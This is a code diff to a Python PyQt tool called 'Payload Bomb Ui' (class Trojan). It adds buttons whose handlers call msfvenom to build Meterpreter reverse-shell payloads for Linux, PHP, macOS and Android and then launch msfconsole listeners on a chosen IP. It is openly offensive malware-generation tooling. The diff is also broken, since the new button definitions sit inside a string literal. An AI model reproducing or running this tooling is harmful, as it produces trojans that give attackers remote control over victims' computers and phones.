@@ -65,12 +65,22 @@ class Trojan(QWidget):
         h_box.addStretch()        
         h_box.addLayout(v_box)
         h_box.addStretch()
-
+"""
+        self.win        = QPushButton("Windows")        
+        self.lin        = QPushButton("Linux")
+        self.mac        = QPushButton("Mac")
+        self.web        = QPushButton("Php")
+        self.apk        = QPushButton("Android")
+"""
 
         
         self.setLayout(h_box)
         self.win.clicked.connect(self.windows)
         self.ip.clicked.connect(self.ip_adres)
+        self.lin.clicked.connect(self.linux)
+        self.mac.clicked.connect(self.macos)
+        self.web.clicked.connect(self.webphp)
+        self.apk.clicked.connect(self.android)
         self.setWindowTitle("Payload Bomb Ui")
         self.show()
 
@@ -81,6 +91,24 @@ class Trojan(QWidget):
     def windows(self):
         os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport=4444 -f exe > {}test.exe".format(self.usr_ip.text(),self.usr_path.text()))
         os.system('msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost {} ; set lport 4444 ; exploit ;"'.format(self.usr_ip.text()))
+
+    def linux(self):
+        os.system('msfvenom -p python/meterpreter/reverse_tcp lhost={} lport=4444 > {}test.py'.format(self.usr_ip.text(),self.usr_path.text()))
+        os.system('msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost {} ; set lport 4444 ; exploit ;"'.format(self.usr_ip.text()))
+  
+    def webphp(self):
+        os.system('msfvenom -p php/meterpreter/reverse_tcp lhost={} lport=4444 > {}test.php'.format(self.usr_ip.text(),self.usr_path.text()))
+        os.system('msfconsole -q -x " use exploit/multi/handler; set payload php/meterpreter/reverse_tcp;  set lhost {} ; set lport 4444 ; exploit ;"'.format(self.usr_ip.text()))
+    def macos(self):
+        os.system('msfvenom -p java/meterpreter/reverse_tcp lhost={} lport=4444 -f jar > {}test.jar'.format(self.usr_ip.text(),self.usr_path.text()))
+        os.system('msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost {} ; set lport 4444 ; exploit ;"'.format(self.usr_ip.text()))
+    def android(self):
+        os.system('msfvenom -p android/meterpreter/reverse_tcp lhost={} lport=4444 > {}test.apk'.format(self.usr_ip.text(),self.usr_path.text()))
+        os.system('msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost {} ; set lport 4444 ; exploit ;"'.format(self.usr_ip.text()))
+
+
+
+
 
     def ip_adres(self):
         if os.name == "posix":
